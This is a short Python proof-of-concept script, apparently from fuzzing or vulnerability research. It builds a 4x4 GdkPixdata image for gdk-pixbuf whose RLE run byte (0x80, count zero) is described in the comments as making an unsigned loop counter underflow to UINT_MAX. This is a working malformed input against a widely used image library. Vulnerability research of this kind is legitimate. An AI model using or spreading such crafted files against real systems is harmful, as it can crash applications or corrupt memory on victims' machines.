#!/usr/bin/env python3
import struct, os

poc_dir = "/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf_c"
os.makedirs(poc_dir, exist_ok=True)

magic = 0x47646b50  # "GdkP"
width = 4
height = 4
bpp = 3  # RGB
rowstride = width * bpp
# pixdata_type: GDK_PIXDATA_ENCODING_RLE (0x02<<24) | GDK_PIXDATA_SAMPLE_WIDTH_8 (0x01<<16) | GDK_PIXDATA_COLOR_TYPE_RGB (0x01)
# GDK_PIXDATA_ENCODING_RLE = 0x02 << 24 = 0x02000000
# GDK_PIXDATA_SAMPLE_WIDTH_8 = 0x01 << 16 = 0x00010000
# GDK_PIXDATA_COLOR_TYPE_RGB = 0x01
pixdata_type = 0x02010001

# RLE pixel data: 0x80 = repeat-run with count=0 (triggers underflow), followed by RGB pixel
# After 0x80: count = 0x80 & 0x7f = 0. Loop decrements unsigned: 0-1 = UINT_MAX.
pixel_data = b'\x80' + b'\xff\x00\x00'  # byte 0x80, then RGB pixel

total_length = 24 + len(pixel_data)

header = struct.pack('>IIIIII',
    magic,
    total_length,
    pixdata_type,
    rowstride,
    width,
    height,
)

data = header + pixel_data

outfile = os.path.join(poc_dir, "vuln_001.gdkp")
with open(outfile, 'wb') as f:
    f.write(data)

print(f"Generated {outfile} ({len(data)} bytes)")
print(f"  magic=0x{magic:08X}, type=0x{pixdata_type:08X}")
print(f"  {width}x{height} RGB RLE, rowstride={rowstride}")
print(f"  pixel_data: {pixel_data.hex()} (0x80 = repeat-run, count=0 -> underflow)")
